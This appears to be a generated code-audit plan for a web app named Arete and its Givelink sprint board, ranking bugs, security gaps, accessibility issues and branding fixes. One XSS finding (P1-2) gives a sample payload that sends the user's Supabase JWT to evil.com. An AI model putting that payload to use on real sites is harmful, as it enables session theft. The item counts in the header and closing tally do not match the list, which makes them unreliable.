# Arete — Improvement Plan

_Generated 2026-09-19 · 20 items across 4 tiers · ordered by ROI within each tier_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

---

### P0-1 · Push notification icon path broken — every notification shows no icon

- **What**: `sw.js` and `index.html` both reference `./icons/icon-192.png`, but the actual file lives at `./icon-192.png` — no `icons/` directory exists.
- **Where**: `sw.js:46–47`, `index.html:11289`
- **Why it matters**: Every browser push notification and local reminder fires with a missing icon, reducing visual trust and making notifications indistinguishable from spam.
- **Effort**: S
- **Suggested fix**:
  - In `sw.js:46–47`: change both `./icons/icon-192.png` to `./icon-192.png`.
  - In `index.html:11289`: same replacement in the `new Notification(...)` options.

---

### P0-2 · `callClaude` direct-browser path has no `res.ok` guard — API errors silently return `null`

- **What**: The server-proxy path checks `res.ok` (line 5026), but the direct-browser path (when the user provides their own key) calls `res.json()` unconditionally before the check.
- **Where**: `index.html:5023–5028`
- **Why it matters**: A 401 or 429 from Anthropic will parse as a garbled JSON response; the existing error-toast code at line 5026–5029 never fires for these cases, so AI features silently return `null` and the user sees no feedback.
- **Effort**: S
- **Suggested fix**:
  - Move the `if(!res.ok)` block (line 5026) **before** any `.json()` call so it runs for both paths.
  - Both paths already share the toast logic — just reorder.

---

### P0-3 · Givelink `load()` missing try/catch on `JSON.parse` — corrupted storage crashes sprint board

- **What**: `function load()` in `givelink.html` calls `JSON.parse(d)` without a try/catch; a malformed value halts all subsequent JS.
- **Where**: `givelink.html:453`
- **Why it matters**: Corrupted localStorage (browser bug, cross-origin write, or manual edit) renders the entire Givelink sprint board blank with no error message and no recovery path.
- **Effort**: S
- **Suggested fix**:
  - Wrap the parse: `try { const p = JSON.parse(d); S = {...S, ...p}; } catch(e) { localStorage.removeItem('givelink_sprint'); }`

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

---

### P1-1 · No per-user rate limiting on Claude API proxy — bill-spiking attack surface

- **What**: Any authenticated Supabase user can send unlimited requests through `/api/claude`, which forwards directly to Anthropic.
- **Where**: `api/claude.js:12` (existing TODO comment), entire file
- **Why it matters**: One bad actor — or a compromised session token — can exhaust the monthly Anthropic quota in minutes, taking down AI features for all users and generating an unexpected bill.
- **Effort**: M
- **Suggested fix**:
  - Add Upstash Redis rate limiting (10 req/min per `uid` from the Supabase JWT).
  - Alternatively, track usage in a Supabase `usage` table with a DB function and reject requests over a threshold.
  - Block model/max_tokens overrides from the client — fix these server-side.

---

### P1-2 · XSS: task titles and goal titles rendered unescaped in Weekly Review wizard

- **What**: The Weekly Review wizard renders `${t.title}` and `${g.title}` directly into `innerHTML` template literals without calling `esc()`.
- **Where**: `index.html:3594`, `3601`, `3603`
- **Why it matters**: A task named `<img src=x onerror="fetch('https://evil.com?c='+localStorage.getItem('taskos_sb_access'))">` executes on every Weekly Review open, exfiltrating the Supabase JWT.
- **Effort**: S
- **Suggested fix**:
  - Replace `${t.title}` with `${esc(t.title)}` and `${g.title}` with `${esc(g.title)}` in all three innerHTML assignments.
  - Audit other template literals in `renderWizPanel` for the same pattern.

---

### P1-3 · Hardcoded personal AI context — all non-founder users get wrong AI suggestions

- **What**: Three AI prompts hardcode `"Panos — Greek founder in his 20s building Givelink..."` as the user context, bypassing the `getAboutMe()` function that reads from Settings.
- **Where**: `index.html:5445`, `7849`, `9807`
- **Why it matters**: Every non-founder user's AI day-plan, task triage, and reflection prompts are primed with someone else's biography, producing completely irrelevant suggestions and making the app feel broken.
- **Effort**: S
- **Suggested fix**:
  - Add `const about = getAboutMe() || '';` at the top of each function.
  - Replace the hardcoded literals with `${about}` in the prompt string.

---

### P1-4 · "Givelink" hardcoded as a nav item and seeded data for all users

- **What**: `_MORE_NAV_GROUPS` includes `{id:'givelink-dash', e:'🟣', l:'Givelink'}`, and AGI/SF-Timeline seed data contains Givelink-specific decisions and milestones shown to every new user.
- **Where**: `index.html:9569` (nav), `9625–9631` (AGI seed), `9826–9836` (SF Timeline seed)
- **Why it matters**: New users see an irrelevant "Givelink" button in their nav and find their AGI tracker pre-filled with decisions about a company they don't run, destroying the "personal OS" first impression.
- **Effort**: M
- **Suggested fix**:
  - Remove `givelink-dash` from the default nav; make it user-opt-in via a "My Business" category in nav settings.
  - Replace all seed data with neutral generic examples (e.g., "Decide how AI will change your role").

---

### P1-5 · Share card still says "TaskOS" — old branding shipped on every shared image

- **What**: `_drawStatsCard()` renders the brand label as two separate `fillText` calls for `'Task'` + `'OS'` on the shareable progress card canvas.
- **Where**: `index.html:10214–10215`, `10232` (hardcoded URL)
- **Why it matters**: Every shareable card distributed externally carries the old product name and the literal Vercel deployment URL instead of the canonical brand — undermining the Arete rebrand and making the product look unpolished.
- **Effort**: S
- **Suggested fix**:
  - Replace `fillText('Task',...)` + `fillText('OS',...)` with a single `fillText('Arete',...)`.
  - Change line 10232 to `x.fillText('Made with Arete · ' + _APP_URL.replace('https://',''), ...)`.

---

### P1-6 · Givelink: all sidebar nav items are non-interactive `<div>` elements

- **What**: Every `<div class="ni" onclick="nav('...')">` in the Givelink sidebar (Overview, Week, each pillar, CRM, Backlog, Past Sprints) is invisible to keyboard navigation and announces as static text to screen readers.
- **Where**: `givelink.html:233–245`
- **Why it matters**: Keyboard-only users and screen reader users cannot navigate the sprint board at all — every view requires a mouse click on an element that is not part of the tab order.
- **Effort**: S
- **Suggested fix**:
  - Replace `<div class="ni" onclick="...">` with `<button class="ni" onclick="...">`.
  - Existing `.ni:hover` and `.ni.active` CSS selectors transfer unchanged.

---

### P1-7 · Auth gate inputs have no visible label or aria-label

- **What**: The sign-in email and password fields carry only a `placeholder`; no `<label>`, `aria-label`, or `aria-labelledby` is associated.
- **Where**: `index.html:877–878`
- **Why it matters**: Screen reader users hear no field name when focusing these inputs, violating WCAG 2.1 SC 1.3.1. Placeholders vanish on type, removing the prompt for low-vision users using zoom.
- **Effort**: S
- **Suggested fix**:
  - Add `aria-label="Email address"` and `aria-label="Password"` to the two inputs, or wrap each in a `<label for="...">` element.

---

### P1-8 · `genAIChallenge` regex `\s` escape broken — challenge cards always render blank

- **What**: `new RegExp(key+':\s*(.+)')` — `\s` inside a JS string is literal `s`, not the whitespace metacharacter, so the regex never matches Claude's response lines.
- **Where**: `index.html:6516`
- **Why it matters**: Every AI-generated daily challenge shows empty CHALLENGE, WHY, DAILY_HABIT, and SUCCESS fields. Users clicking "Generate" see a blank card and no explanation.
- **Effort**: S
- **Suggested fix**:
  - Change to `new RegExp(key+':\\s*(.+)')` (double-escape the backslash).
  - Or use a regex literal: `/^CHALLENGE:\s*(.+)/`.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

---

### P2-1 · Recurring task date parsed as UTC — tasks schedule one day early for users west of UTC

- **What**: `new Date(t.dueDate)` on a `YYYY-MM-DD` string parses as UTC midnight; `.getDate()` in local time returns the prior day for UTC− timezones.
- **Where**: `index.html:3869`
- **Why it matters**: Daily and weekly recurring tasks for any user in the Americas or Pacific silently drift one day backward on each recurrence, breaking the most reliable productivity feature.
- **Effort**: S
- **Suggested fix**:
  - Parse as local: `const [y,m,d]=t.dueDate.split('-'); const dt=new Date(y,m-1,d);`
  - Apply this pattern consistently wherever `YYYY-MM-DD` strings are parsed.

---

### P2-2 · Offline pill permanently invisible — double-hidden element

- **What**: `<span id="offline-pill" class="hidden" style="display:none;">` has both a CSS `.hidden` class and an inline `style="display:none"`. Removing the class in JS leaves the inline style active.
- **Where**: `index.html:847`
- **Why it matters**: Users who go offline get no visual indicator even though the logic correctly detects network loss and fires the status update — a feature that was built but never shows.
- **Effort**: S
- **Suggested fix**:
  - Remove `style="display:none"` from the element; let only the `.hidden` class control visibility.

---

### P2-3 · `--faint` CSS variable used but never defined — hint text renders wrong

- **What**: `.gg-ct`, `.proc-hint`, and `.fr-hint` reference `var(--faint)` which is absent from both the dark and light `:root` blocks; it falls back to `inherit`.
- **Where**: `index.html:143`, `301`, `917`
- **Why it matters**: Those hint labels render at full body-text brightness instead of the intended muted grey, degrading visual hierarchy in the capture flow and process cards.
- **Effort**: S
- **Suggested fix**:
  - Add `--faint: rgba(255,255,255,0.3);` to the dark `:root` block (line ~45).
  - Add `--faint: rgba(0,0,0,0.3);` to the `.light` override block.

---

### P2-4 · Givelink: `S.snapshots` not cleared on sprint rollover — burndown chart corrupts

- **What**: `confirmNewSprint()` resets `S.sprint` but leaves `S.snapshots` intact; the burndown chart then overlays old-sprint data points on the new sprint's totals.
- **Where**: `givelink.html:914`
- **Why it matters**: From day 1 of a new sprint, the burndown chart is misleading — showing historical data that deflates apparent progress and confuses retrospectives.
- **Effort**: S
- **Suggested fix**:
  - Add `S.snapshots = [];` at line 914, alongside the `S.sprint = {...}` reset.

---

### P2-5 · Givelink: standup "yesterday" threshold is 48h, not 24h

- **What**: `yesterday.setDate(now.getDate()-2)` includes tasks completed up to ~48 hours ago in the "Completed Yesterday" standup section.
- **Where**: `givelink.html:1561`
- **Why it matters**: Tasks finished the day before yesterday appear in both "Yesterday" and "In Progress", inflating completed counts and confusing handoffs.
- **Effort**: S
- **Suggested fix**:
  - Change `-2` to `-1`.

---

### P2-6 · `renderSecurity()` is 1,227 lines — untestable and unsearchable

- **What**: The entire Security view renders inside a single function spanning ~1,227 lines.
- **Where**: `index.html:13699–14926`
- **Why it matters**: Any change to the security checklist requires navigating ~1,200 lines of densely minified HTML-in-JS strings. Bug surface is enormous; no section can be found with a quick search.
- **Effort**: L
- **Suggested fix**:
  - Extract at minimum 4 sub-renderers: `_renderSecurityScore()`, `_renderSecurityChecklist()`, `_renderSecurityLog()`, `_renderSecurityAuditModal()`.
  - Apply the same pattern to `renderAilab()` (772 lines from line 4438).

---

### P2-7 · Hardcoded "Panos" in greeting HTML — leaks personal info on first paint

- **What**: `<h1 id="greeting">Good morning, Panos 👋</h1>` embeds the developer's name in the static HTML; this text is visible on every crawler, screenshot, and slow-connection first paint before JS runs.
- **Where**: `index.html:1070`
- **Why it matters**: The product's own marketing HTML greets every new visitor with someone else's name, destroying the "personal" feel before the page even loads.
- **Effort**: S
- **Suggested fix**:
  - Change the default to `<h1 id="greeting">Good morning 👋</h1>`.
  - The JS `renderDash()` already writes the correct greeting; no JS change needed.

---

### P2-8 · Givelink: `window.prompt()` used to collect API key — hostile on mobile, insecure

- **What**: `getApiKey()` and `callClaudeGL()` call `window.prompt()` to collect the Anthropic key, storing it in `localStorage` without any security warning.
- **Where**: `givelink.html:1155`, `1330`
- **Why it matters**: `prompt()` is a blocking dialog that cannot be styled, is often suppressed on mobile browsers, and gives no indication that the key will be persisted in localStorage accessible to all page JS.
- **Effort**: M
- **Suggested fix**:
  - Replace with an inline modal reusing the existing `.mo`/`.md` pattern with a `type="password"` input.
  - Add a visible notice: "Stored in your browser's localStorage — do not use on shared computers."

---

## 💡 P3 — Nice to have

---

### P3-1 · Landing page PostHog key is an empty string — funnel analytics silently disabled

- **What**: `var POSTHOG_KEY = '';` in `landing.html` means all CTA clicks, scroll depth, and demo impressions are never tracked.
- **Where**: `landing.html:702`
- **Why it matters**: Without landing funnel data it's impossible to identify which CTA or section drives signups, stalling conversion optimization.
- **Effort**: S
- **Suggested fix**:
  - Set the real PostHog key, or add `// TODO: replace before deploy` comment.
  - Ideally inject at build time via an environment variable substitution so the key never appears in source.

---

### P3-2 · Brand: Givelink PWA `theme-color` is `#3b82f6` (Tailwind blue) — wrong chrome color

- **What**: `<meta name="theme-color" content="#3b82f6">` sets the browser chrome / status-bar color to blue for Givelink's PWA.
- **Where**: `givelink.html:6`
- **Why it matters**: Users who install Givelink as a PWA see a Tailwind-blue browser chrome every time they open it — the single most visible brand surface on mobile home screen launch.
- **Effort**: S
- **Suggested fix**:
  - Change to `#5718CA` (brand purple dark) to match the declared palette.

---

### P3-3 · Brand: `dc-card` top accent stripe uses off-palette blue/cyan gradient

- **What**: `.dc-card::before` renders `linear-gradient(90deg, #58a6ff, #22d3ee, #a78bfa)` — `#58a6ff` (blue) and `#22d3ee` (teal) are outside the declared purple/pink brand.
- **Where**: `index.html:535`
- **Why it matters**: The most visually prominent decorative element in the Deep Work view reads as a blue-tech product rather than Arete's purple identity.
- **Effort**: S
- **Suggested fix**:
  - Replace with `linear-gradient(90deg, #6B3FA0, #5718CA, #C2185B)`.

---

### P3-4 · Know Thyself prompt badges use blue, amber, and green — 4 off-palette colors

- **What**: `catColors` for the self-knowledge prompt categories uses `rgba(88,166,255,.15)` (blue), `rgba(251,191,36,.15)` (amber), and `rgba(105,219,124,.15)` (green).
- **Where**: `index.html:9781`
- **Why it matters**: The reflection feature — one of the most user-facing areas — fragments the visual language with four ad-hoc tones, making Arete feel unpolished.
- **Effort**: S
- **Suggested fix**:
  - Collapse to two brand tones: shadows/patterns → `rgba(107,63,160,.15)` (purple); values/drives → `rgba(194,24,91,.15)` (pink).

---

_Total: 4 P0/P1 bugs · 6 P1 UX improvements · 6 P2 code health · 4 P3 polish items_
